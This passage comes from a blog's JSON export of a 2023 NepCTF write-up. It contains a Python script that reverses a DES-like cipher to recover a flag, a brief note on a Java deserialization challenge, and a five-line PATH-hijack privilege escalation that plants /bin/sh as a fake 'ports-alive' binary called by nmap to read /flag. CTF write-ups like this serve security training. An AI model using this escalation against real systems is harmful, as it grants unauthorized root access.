class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>, <span class=\"number\">1</span>, <span class=\"number\">0</span>]</span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">16</span>):</span><br><span class=\"line\">    combined = LL + RR</span><br><span class=\"line\">    sub_key = PC_2(combined)</span><br><span class=\"line\">    sub_keys.append(sub_key)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(ROTATIONS[::-<span class=\"number\">1</span>][i]):</span><br><span class=\"line\">        LL.insert(<span class=\"number\">0</span>, LL.pop(-<span class=\"number\">1</span>))</span><br><span class=\"line\">        RR.insert(<span class=\"number\">0</span>, RR.pop(-<span class=\"number\">1</span>))</span><br><span class=\"line\">ct = decrypt(P_set(t[:<span class=\"number\">64</span>], P0_inv), sub_keys)</span><br><span class=\"line\">raw = P_set(ct, _IP_inv)</span><br><span class=\"line\">x = bin2str(raw)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(x)</span><br><span class=\"line\">flag += x</span><br><span class=\"line\"></span><br><span class=\"line\">z = raw</span><br><span class=\"line\">keys_t = LL + RR</span><br><span class=\"line\">key = [<span class=\"number\">0</span>] * <span class=\"number\">64</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i, b <span class=\"keyword\">in</span> <span class=\"built_in\">enumerate</span>(__pc1):</span><br><span class=\"line\">    key[b] = keys_t[i]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(key)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(bin2str(key))</span><br><span class=\"line\">ct = decrypt(P_set(t[<span class=\"number\">64</span>:<span class=\"number\">64</span>*<span class=\"number\">2</span>], P0_inv), get_sub_key(bitxor(z, key))[::-<span class=\"number\">1</span>])</span><br><span class=\"line\">raw = P_set(ct, _IP_inv)</span><br><span class=\"line\">x = bin2str(raw)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(x)</span><br><span class=\"line\">flag += x</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">z = raw</span><br><span class=\"line\">ct = decrypt(P_set(t[<span class=\"number\">64</span>*<span class=\"number\">2</span>:<span class=\"number\">64</span>*<span class=\"number\">3</span>], P0_inv), get_sub_key(bitxor(z, key))[::-<span class=\"number\">1</span>])</span><br><span class=\"line\">raw = P_set(ct, _IP_inv)</span><br><span class=\"line\">x = bin2str(raw)</span><br><span class=\"line\"><span class=\"built_in\">print</span>(x)</span><br><span class=\"line\">flag += x</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"Web\"><a href=\"#Web\" class=\"headerlink\" title=\"Web\"></a>Web</h1><h2 id=\"ez-java-checkin\"><a href=\"#ez-java-checkin\" class=\"headerlink\" title=\"ez_java_checkin\"></a>ez_java_checkin</h2><p>简单的java反序列化漏洞，一把梭</p>\n<p><img src=\"/p/2023NepCTF/4bfea74d624d582500046b3938b36a9.png\" alt=\"4bfea74d624d582500046b3938b36a9\"></p>\n<h2 id=\"独步天下-转生成为镜花水月中的王者\"><a href=\"#独步天下-转生成为镜花水月中的王者\" class=\"headerlink\" title=\"独步天下-转生成为镜花水月中的王者\"></a>独步天下-转生成为镜花水月中的王者</h2><p>渗透签到，提示环境变量提权，一把梭</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">echo &quot;/bin/sh&quot;&gt; /tmp/ports-alive</span><br><span class=\"line\">chmod 777 /tmp/ports-alive</span><br><span class=\"line\">export PATH=/tmp:$PATH</span><br><span class=\"line\">nmap -v</span><br><span class=\"line\">cat /flag</span><br></pre></td></tr></table></figure>\n\n","path":"/p/2023NepCTF/","permalink":"https://blog.csome.cc/p/2023NepCTF/","tags":[{"name":"CTF","_id":"cuidhe2mLrs_RBYmTzHeWmv47","slug":"CTF","path":"tags/CTF/","permalink":"https://blog.csome.cc/tags/CTF/","length":15},{"name":"Pwn","_id":"cuidE5EaGl_nziC_ifU_P2m7I","slug":"Pwn","path":"tags/Pwn/","permalink":"https://blog.csome.cc/tags/Pwn/","length":15},{"name":"NepCTF","_id":"cuidT4sycefjuR2jL3yIK_JnW","slug":"NepCTF","path":"tags/NepCTF/","permalink":"https://blog.csome.cc/tags/NepCTF/","length":1}],"categories":[],"prev":{"title":"Bring back the stack attack -- House of some一种高版本glibc的利用思路","date":"2023-11-17T14:21:52.000Z","slug":"house-of-some","published":true,"updated":"2025-10-28T08:00:40.767Z","_id":"cuidy8Ovnu5lZqYZLaAVRPTxi","layout":"post","photos":[],"excerpt":"","path":"/p/house-of-some/","permalink":"https://blog.csome.cc/p/house-of-some/","__post":true},"next":{"title":"[2022CISCN]华南赛区分区赛 部分Pwn wp","date":"2022-06-21T08:15:02.000Z","slug":"2022CISCN-hn-wp","published":true,"updated":"2025-10-28T08:00:40.720Z","_id":"cuida-laf2JC6VtwruGY4Y-fM","layout":"post","photos":[],"excerpt":"","path":"/p/2022CISCN-hn-wp/","permalink":"https://blog.csome.cc/p/2022CISCN-hn-wp/","__post":true},"__post":true}